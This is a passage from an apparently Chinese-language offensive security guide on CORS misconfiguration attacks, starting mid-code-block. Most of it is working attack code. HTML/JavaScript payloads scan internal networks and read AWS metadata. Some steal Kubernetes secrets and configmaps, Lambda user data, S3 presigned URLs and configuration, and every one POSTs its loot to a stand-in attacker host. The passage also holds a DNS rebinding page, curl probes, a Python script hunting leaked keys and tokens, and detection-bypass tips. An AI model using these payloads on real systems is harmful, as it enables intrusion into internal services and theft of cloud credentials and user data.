    'http://10.0.0.100:8001/api/v1/pods',           // Kubernetes
    'http://192.168.1.1/admin',                     // 路由器
    'http://169.254.169.254/latest/meta-data/',     // AWS 元数据
];

internalServices.forEach(function(url) {
    fetch(url, { mode: 'cors' })
        .then(r => r.text())
        .then(data => {
            // CORS: * → 可以读取响应!
            fetch('https://test-attacker.com/internal', {
                method: 'POST',
                body: JSON.stringify({ url: url, data: data })
            });
        })
        .catch(e => {
            // 记录不可达的服务
            fetch('https://test-attacker.com/scan', {
                method: 'POST',
                body: JSON.stringify({ url: url, error: e.message })
            });
        });
});
</script>
</body>
</html>
```

**Step 2 — 窃取内部 Kubernetes 配置**：
```html
<html>
<body>
<script>
// 如果内部 K8s API 有 CORS: * → 可以读取集群信息

// 1. 获取所有 pods
fetch('http://k8s-api.internal:8001/api/v1/pods')
.then(r => r.json())
.then(pods => {
    // 外传 pod 列表(包含镜像、环境变量等)
    fetch('https://test-attacker.com/k8s-pods', {
        method: 'POST',
        body: JSON.stringify(pods)
    });
    
    // 2. 获取 secrets
    return fetch('http://k8s-api.internal:8001/api/v1/secrets');
})
.then(r => r.json())
.then(secrets => {
    // 外传所有 secrets(包含数据库密码、API keys 等)
    fetch('https://test-attacker.com/k8s-secrets', {
        method: 'POST',
        body: JSON.stringify(secrets)
    });
    
    // 3. 获取 configmaps
    return fetch('http://k8s-api.internal:8001/api/v1/configmaps');
})
.then(r => r.json())
.then(configmaps => {
    fetch('https://test-attacker.com/k8s-configmaps', {
        method: 'POST',
        body: JSON.stringify(configmaps)
    });
});
</script>
</body>
</html>
```

**Step 3 — 利用 DNS Rebinding 绕过 CORS hostname 限制**：
```python
# DNS Rebinding 攻击脚本
# 某些内部 API 检查 Host 头而非 Origin → DNS rebinding 可绕过

# Step 1: 配置攻击者域名 DNS(短 TTL)
# evil.com → A 记录 → 攻击者 IP (TTL=0)
# evil.com → A 记录 → 内部 IP 10.0.0.5 (TTL=0)

# Step 2: 受害者访问 https://evil.com/attack.html
# 第一次 DNS 解析 → 攻击者 IP → 返回恶意 JS
# 第二次 DNS 解析(同一个域名) → 内部 IP → fetch 到内部 API

# dnsmasq 配置示例:
# address=/rebind.evil.com/ATTACKER_IP
# address=/rebind.evil.com/10.0.0.5

attack_html = """
<html>
<body>
<script>
// DNS Rebinding: evil.com 先解析到攻击者,再解析到内网

// 等待 DNS 缓存过期(TTL=0 → 立即过期)
setTimeout(function() {
    // 此时 evil.com 可能解析到内部 IP
    // fetch 到 evil.com 实际访问内部 API
    fetch('http://evil.com:8080/admin/config')
    .then(r => r.text())
    .then(data => {
        // 由于同源(evil.com → evil.com) → 无 CORS 限制
        // 但实际访问的是内部 API
        fetch('https://test-attacker.com/rebind-data', {
            method: 'POST',
            body: data
        });
    });
}, 5000);  // 等待 DNS 重新解析
</script>
</body>
</html>
"""

print("DNS Rebinding 攻击页面已部署")
print("受害者访问后,5秒后 JS 将访问内部 API")
```

**Step 4 — 完整的内网渗透链**：
```html
<html>
<body>
<script>
// 完整内网渗透: 发现 → 读取 → 横向移动

async function internalPentest() {
    var results = {};
    
    // Phase 1: 内网端口扫描(通过时序差异)
    var scanTargets = [];
    for (var i = 1; i <= 254; i++) {
        scanTargets.push('http://10.0.0.' + i + ':8080');
    }
    
    var openPorts = [];
    for (var target of scanTargets) {
        var start = performance.now();
        try {
            await fetch(target, { mode: 'no-cors', cache: 'no-store' });
            var elapsed = performance.now() - start;
            if (elapsed < 100) {
                openPorts.push({ url: target, time: elapsed });
            }
        } catch(e) {
            var elapsed = performance.now() - start;
            if (elapsed > 100 && elapsed < 5000) {
                openPorts.push({ url: target, time: elapsed, status: 'filtered' });
            }
        }
    }
    results.openPorts = openPorts;
    
    // Phase 2: 读取开放服务的响应
    for (var port of openPorts) {
        try {
            var resp = await fetch(port.url, { mode: 'cors' });
            if (resp.ok) {
                var data = await resp.text();
                results[port.url] = data.substring(0, 1000);
            }
        } catch(e) {
            // CORS 阻止读取 → 但服务存在
        }
    }
    
    // Phase 3: 外传所有结果
    fetch('https://test-attacker.com/internal-scan', {
        method: 'POST',
        body: JSON.stringify(results)
    });
}

internalPentest();
</script>
</body>
</html>
```

**检测绕过技巧**：
```text
1. CORS 阻止读取 → 使用 no-cors 模式 + 时序侧信道推断
2. 内部 IP 被 WAF 拦截 → 使用 DNS rebinding(域名解析到内网 IP)
3. HTTPS → HTTP 混合内容阻止 → 使用 <img> 标签(不检查 CORS)
4. 浏览器阻止访问私有 IP → 利用 DNS rebinding 绕过(域名 → 私有 IP)
5. Host 头检查 → DNS rebinding 使 Host 头与目标匹配
```

**CVE 参考**：2026 年内部 API 暴露 + CORS 通配符漏洞、DNS Rebinding 在云环境中的利用。

---

### 攻击链 5: 2026 Serverless 函数 CORS(AWS Lambda)

**目标场景**：2026 年大量应用使用 AWS Lambda + API Gateway 部署 Serverless API。Lambda 函数的 CORS 配置通常在 API Gateway 层设置，但函数内部也可能设置 CORS 头，导致配置冲突或覆盖。攻击者利用配置不一致绕过 CORS 限制。

**漏洞模式**：
```text
# AWS API Gateway CORS 配置(仅允许 https://app.target.com)
Access-Control-Allow-Origin: https://app.target.com

# 但 Lambda 函数内部也设置了 CORS 头(覆盖 API Gateway 配置):
# Lambda 代码中: 
# return { headers: { 'Access-Control-Allow-Origin': '*' } }
# → Lambda 的 * 覆盖了 API Gateway 的白名单

# 或者 API Gateway 启用了 CORS 代理 → 反射任意 Origin
# → 攻击者可以跨域读取响应
```

**逐步利用**：

**Step 1 — 识别 Lambda/API Gateway CORS 配置不一致**：
```bash
# 测试 API Gateway 层 CORS
curl -sI -H "Origin: https://evil.com" https://api.target.com/prod/user
# 如果 ACAO: https://app.target.com → API Gateway 层限制

# 测试不同路径(某些路径直接到 Lambda,绕过 API Gateway CORS)
curl -sI -H "Origin: https://evil.com" https://api.target.com/prod/user/profile
# 如果 ACAO: * → Lambda 函数内部设置了通配符(漏洞!)

# 测试 preflight
curl -sI -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  https://api.target.com/prod/user/update
# 检查 preflight 响应的 CORS 头
```

**Step 2 — 构造 Serverless CORS 攻击 PoC**：
```html
<html>
<body>
<script>
// Lambda CORS 攻击 — 利用函数内部通配符覆盖

// 某些 Lambda 函数路径绕过了 API Gateway 的 CORS 限制
// 因为函数内部设置了 Access-Control-Allow-Origin: *

// 1. 读取用户数据(通过 Lambda 函数直接暴露的路径)
fetch('https://api.target.com/prod/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(profile => {
    console.log('用户数据:', profile);
    fetch('https://test-attacker.com/profile', {
        method: 'POST',
        body: JSON.stringify(profile)
    });
});

// 2. 调用管理函数(如果 Lambda 函数无认证 + CORS: *)
fetch('https://api.target.com/prod/admin/list-users', {
    credentials: 'include'
})
.then(r => r.json())
.then(users => {
    // 窃取所有用户列表
    fetch('https://test-attacker.com/users', {
        method: 'POST',
        body: JSON.stringify(users)
    });
});

// 3. 调用内部函数(如果 Lambda 暴露了内部 API)
fetch('https://api.target.com/prod/internal/config', {
    credentials: 'include'
})
.then(r => r.json())
.then(config => {
    // 窃取内部配置(含数据库连接字符串、密钥等)
    fetch('https://test-attacker.com/config', {
        method: 'POST',
        body: JSON.stringify(config)
    });
});
</script>
</body>
</html>
```

**Step 3 — 利用 Lambda 预签名 URL 窃取**：
```html
<html>
<body>
<script>
// 某些 Lambda 函数返回 S3 预签名 URL
// 如果 CORS: * → 攻击者可以获取预签名 URL → 访问私有 S3 文件

// 1. 获取预签名 URL
fetch('https://api.target.com/prod/files/download-url?fileId=12345', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    var presignedUrl = data.url;
    console.log('预签名 URL:', presignedUrl);
    
    // 2. 使用预签名 URL 下载文件
    return fetch(presignedUrl);
})
.then(r => r.text())
.then(fileContent => {
    // 窃取文件内容
    fetch('https://test-attacker.com/file', {
        method: 'POST',
        body: fileContent
    });
});

// 3. 枚举文件 ID(如果 Lambda 不验证文件所有权)
for (var i = 1; i <= 100; i++) {
    fetch('https://api.target.com/prod/files/download-url?fileId=' + i, {
        credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
        if (data.url) {
            // 窃取每个文件的预签名 URL
            fetch('https://test-attacker.com/urls', {
                method: 'POST',
                body: JSON.stringify({ id: i, url: data.url })
            });
        }
    });
}
</script>
</body>
</html>
```

**Step 4 — 利用 Lambda 环境变量泄露**：
```python
# 攻击者脚本 — 测试 Lambda 函数是否泄露环境变量

import requests

# 某些 Lambda 函数通过错误消息泄露环境变量
# 或通过调试端点暴露配置

test_endpoints = [
    'https://api.target.com/prod/debug/env',
    'https://api.target.com/prod/config',
    'https://api.target.com/prod/health',
    'https://api.target.com/prod/_meta',
    'https://api.target.com/prod/status',
    'https://api.target.com/prod/error?code=500',
    'https://api.target.com/prod/.env',
    'https://api.target.com/prod/aws/credentials',
]

for url in test_endpoints:
    resp = requests.get(url, headers={
        'Origin': 'https://test-attacker.com'
    })
    
    # 检查 CORS 头
    acao = resp.headers.get('Access-Control-Allow-Origin', '')
    if acao in ['*', 'https://test-attacker.com']:
        print(f'[!] CORS 开放: {url}')
        print(f'    ACAO: {acao}')
        
        # 检查响应中是否包含敏感信息
        text = resp.text
        for keyword in ['AWS_SECRET', 'AWS_ACCESS', 'DATABASE_URL', 
                       'API_KEY', 'SECRET', 'TOKEN', 'PASSWORD']:
            if keyword in text.upper():
                print(f'    [!!!] 发现敏感信息: {keyword}')
                print(f'    响应片段: {text[:200]}')
```

**Step 5 — 利用 API Gateway Stage 环境差异**：
```html
<html>
<body>
<script>
// API Gateway 可能有多个 Stage(prod, dev, staging, beta)
// 不同 Stage 的 CORS 配置可能不同

var stages = ['prod', 'dev', 'staging', 'beta', 'test', 'v1', 'v2'];

stages.forEach(function(stage) {
    // 测试每个 Stage 的 CORS 配置
    fetch('https://api.target.com/' + stage + '/user/profile', {
        credentials: 'include'
    })
    .then(r => {
        var acao = r.headers.get('Access-Control-Allow-Origin');
        if (acao === '*' || acao === 'https://test-attacker.com') {
            console.log('[!] Stage ' + stage + ' CORS 开放!');
            return r.json();
        }
    })
    .then(data => {
        if (data) {
            // 窃取数据
            fetch('https://test-attacker.com/stage-data', {
                method: 'POST',
                body: JSON.stringify({ stage: stage, data: data })
            });
        }
    })
    .catch(() => {});
});

// dev/staging Stage 通常有更宽松的 CORS + 更多调试端点
// 且可能包含测试数据(有时是生产数据的副本)
</script>
</body>
</html>
```

**检测绕过技巧**：
```text
1. API Gateway CORS 限制 → 测试 Lambda 函数内部是否覆盖 CORS 头
   某些函数在代码中设置 ACAO: * → 覆盖 API Gateway 配置

2. Prod Stage 有 CORS 限制 → 测试 dev/staging/beta Stage
   开发环境通常 CORS 更宽松 + 暴露调试端点

3. 认证检查在 API Gateway → Lambda 函数本身无认证
   如果直接访问 Lambda URL(API Gateway 之外的入口) → 无认证

4. Lambda 函数 URL(非 API Gateway)→ 默认无 CORS 限制
   https://xxx.lambda-url.us-east-1.on.aws/ → 可能完全开放

5. 预签名 URL 泄露 → Lambda 生成 S3 预签名 URL 时不验证文件所有权
   → IDOR + CORS 组合 → 窃取任意文件
```

**CVE 参考**：2026 年 AWS Lambda CORS 配置不一致漏洞、Serverless 函数环境变量泄露模式。